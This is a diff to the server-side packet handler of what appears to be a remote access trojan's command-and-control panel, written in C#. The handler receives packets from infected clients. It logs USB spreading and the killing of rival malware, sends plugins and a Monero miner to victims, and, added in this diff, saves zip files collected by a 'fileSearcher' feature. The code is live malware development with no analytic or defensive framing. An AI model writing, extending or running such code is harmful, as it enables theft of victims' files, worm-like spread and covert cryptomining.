@@ -20,7 +20,6 @@ namespace Server.Handle_Packet
             {
                 MsgPack unpack_msgpack = new MsgPack();
                 unpack_msgpack.DecodeFromBytes(data);
-                string ip = client.TcpClient.RemoteEndPoint.ToString().Split(':')[0];
                 Program.form1.Invoke((MethodInvoker)(() =>
                 {
                     switch (unpack_msgpack.ForcePathObject("Packet").AsString)
@@ -47,7 +46,7 @@ namespace Server.Handle_Packet
 
                         case "Logs":
                             {
-                                new HandleLogs().Addmsg($"Client {ip} {unpack_msgpack.ForcePathObject("Message").AsString}", Color.Black);
+                                new HandleLogs().Addmsg($"Client {client.Ip} {unpack_msgpack.ForcePathObject("Message").AsString}", Color.Black);
                                 break;
                             }
 
@@ -60,13 +59,13 @@ namespace Server.Handle_Packet
 
                         case "BotKiller":
                             {
-                                new HandleLogs().Addmsg($"Client {ip} found {unpack_msgpack.ForcePathObject("Count").AsString} malwares and killed them successfully", Color.Orange);
+                                new HandleLogs().Addmsg($"Client {client.Ip} found {unpack_msgpack.ForcePathObject("Count").AsString} malwares and killed them successfully", Color.Orange);
                                 break;
                             }
 
                         case "usb":
                             {
-                                new HandleLogs().Addmsg($"Client {ip} found {unpack_msgpack.ForcePathObject("Count").AsString} USB drivers and spreaded them successfully", Color.Purple);
+                                new HandleLogs().Addmsg($"Client {client.Ip} found {unpack_msgpack.ForcePathObject("Count").AsString} USB drivers and spreaded them successfully", Color.Purple);
                                 break;
                             }
 
@@ -84,7 +83,7 @@ namespace Server.Handle_Packet
 
                         case "Error":
                             {
-                                new HandleLogs().Addmsg($"Client {ip} error: {unpack_msgpack.ForcePathObject("Error").AsString}", Color.Red);
+                                new HandleLogs().Addmsg($"Client {client.Ip} error: {unpack_msgpack.ForcePathObject("Error").AsString}", Color.Red);
                                 lock (Settings.LockListviewClients)
                                 {
                                     client.LV.ForeColor = Color.Empty;
@@ -175,7 +174,7 @@ namespace Server.Handle_Packet
 
                         case "sendPlugin":
                             {
-                                new HandleLogs().Addmsg($"Sending the plugin to client {ip} for the first time please wait..", Color.Blue);
+                                new HandleLogs().Addmsg($"Sending the plugin to client {client.Ip} for the first time please wait..", Color.Blue);
                                 ThreadPool.QueueUserWorkItem(delegate {
                                     client.SendPlugin(unpack_msgpack.ForcePathObject("Hashes").AsString);
                                 });
@@ -185,6 +184,12 @@ namespace Server.Handle_Packet
                         case "GetXmr":
                             {
                                 new HandleMiner().SendMiner(client);
+                                break;
+                            }
+
+                        case "fileSearcher":
+                            {
+                                new HandlerFileSearcher().SaveZipFile(client, unpack_msgpack);
                                 break;
                             }
                     }
